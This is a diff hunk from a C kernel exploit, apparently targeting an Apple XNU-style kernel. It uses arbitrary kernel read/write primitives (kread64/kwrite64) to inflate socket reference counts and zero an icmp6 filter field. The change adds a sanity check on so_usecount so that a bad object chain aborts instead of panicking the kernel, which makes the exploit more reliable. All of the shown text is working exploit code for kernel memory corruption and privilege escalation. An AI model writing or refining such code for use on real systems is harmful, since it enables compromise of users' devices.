@@ -1840,10 +1840,21 @@ abort_no_release:
 
     printf("[+] raising so_count (csa=0x%llx rsa=0x%llx)\n", csa, rsa);
     fflush(stdout);
-    kwrite64(csa + OFFSET_SOCKET_SO_COUNT,
-        kread64(csa + OFFSET_SOCKET_SO_COUNT) + 0x0000100100001001ULL);
-    kwrite64(rsa + OFFSET_SOCKET_SO_COUNT,
-        kread64(rsa + OFFSET_SOCKET_SO_COUNT) + 0x0000100100001001ULL);
+
+    // so_usecount (0x254) must be a small refcount. A sane socket reads back a
+    // low value; anything huge means csa/rsa is NOT a socket (recycled/other
+    // object) and writing there would corrupt a live struct -> panic. Guard so
+    // a bad chain aborts cleanly instead of corrupting memory.
+    uint64_t cSoCount = kread64(csa + OFFSET_SOCKET_SO_COUNT);
+    uint64_t rSoCount = kread64(rsa + OFFSET_SOCKET_SO_COUNT);
+    if (cSoCount > 0x10000 || rSoCount > 0x10000) {
+        printf("[-] so_usecount looks wrong (csa 0x%llx rsa 0x%llx) -- aborting, not corrupting\n",
+               cSoCount, rSoCount);
+        fflush(stdout);
+        return false;
+    }
+    kwrite64(csa + OFFSET_SOCKET_SO_COUNT, cSoCount + 0x0000100100001001ULL);
+    kwrite64(rsa + OFFSET_SOCKET_SO_COUNT, rSoCount + 0x0000100100001001ULL);
     kwrite64(rwSocketPcb + gIcmp6FiltOffset + 8, 0);
     printf("[+] so_count raised, icmp6filt+8 zeroed (filtOff=+0x%llx)\n",
         (unsigned long long)gIcmp6FiltOffset);
